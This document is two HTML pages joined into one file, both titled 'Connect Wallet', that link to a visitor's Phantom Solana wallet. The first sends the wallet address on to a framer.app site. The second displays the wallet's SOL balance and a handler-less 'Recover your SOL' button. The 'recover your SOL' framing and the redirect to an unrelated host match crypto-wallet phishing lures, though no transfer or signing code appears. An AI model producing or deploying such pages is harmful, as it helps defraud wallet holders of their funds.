
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connect Wallet</title>
  <style>
    body {
      background-color: #0f0f0f;
      color: #ffffff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 0.5rem;
    }
    p {
      font-size: 1rem;
      color: #bbbbbb;
      margin-bottom: 2rem;
    }
    button {
      background-color: #8247e5;
      border: none;
      color: white;
      padding: 12px 24px;
      font-size: 1rem;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s ease-in-out;
    }
    button:hover {
      background-color: #6c38c3;
    }
    #status {
      margin-top: 20px;
      font-size: 1rem;
      color: #00ffae;
    }
  </style>
</head>
<body>
  <h1>Connect your wallet</h1>
  <p>Secure connection via Phantom wallet</p>
  <button onclick="connectWallet()">Connect with Phantom</button>
  <div id="status"></div>

  <script>
    async function connectWallet() {
      const status = document.getElementById('status');
      if (window.solana && window.solana.isPhantom) {
        try {
          status.innerText = "Connecting...";
          const response = await window.solana.connect();
          const walletAddress = response.publicKey.toString();
          status.innerText = "Connected! Redirecting...";
          setTimeout(() => {
            window.location.href = `https://cultural-goals-422147.framer.app/?wallet=${walletAddress}`;
          }, 1000);
        } catch (err) {
          status.innerText = "Connection cancelled or failed.";
        }
      } else {
        status.innerText = "Phantom wallet not found. Please install it.";
      }
    }
  </script>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Connect Wallet</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.88.0/lib/index.iife.min.js"></script>
</head>
<body style="font-family: sans-serif; padding: 40px;">

  <h1>Connect your wallet</h1>
  <button id="connectButton">Connect Wallet</button>
  <p id="walletStatus"></p>

  <div id="solStatus"></div>

  <script>
    const connectButton = document.getElementById("connectButton");
    const status = document.getElementById("walletStatus");
    const solStatus = document.getElementById("solStatus");

    let provider = null;
    let userPublicKey = null;

    const getProvider = () => {
      if ("phantom" in window) {
        const anyWindow = window;
        const provider = anyWindow.phantom?.solana;
        if (provider?.isPhantom) return provider;
      }
      window.open("https://phantom.app/", "_blank");
    };

    connectButton.addEventListener("click", async () => {
      provider = getProvider();
      if (!provider) return;

      try {
        const resp = await provider.connect();
        userPublicKey = resp.publicKey.toString();
        status.innerText = `Wallet connected: ${userPublicKey}`;
        checkClaimableSOL(userPublicKey);
      } catch (err) {
        console.error("Connection error:", err);
      }
    });

    async function checkClaimableSOL(walletAddress) {
      const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");

      try {
        const balance = await connection.getBalance(new solanaWeb3.PublicKey(walletAddress));
        const sol = balance / solanaWeb3.LAMPORTS_PER_SOL;

        solStatus.innerHTML = `
          <p>You currently have <strong>${sol.toFixed(4)} SOL</strong> in your wallet.</p>
          <button id="recoverBtn">Recover your SOL</button>
        `;
      } catch (err) {
        solStatus.innerHTML = `<p>Error fetching SOL balance.</p>`;
        console.error(err);
      }
    }
  </script>
</body>
</html>
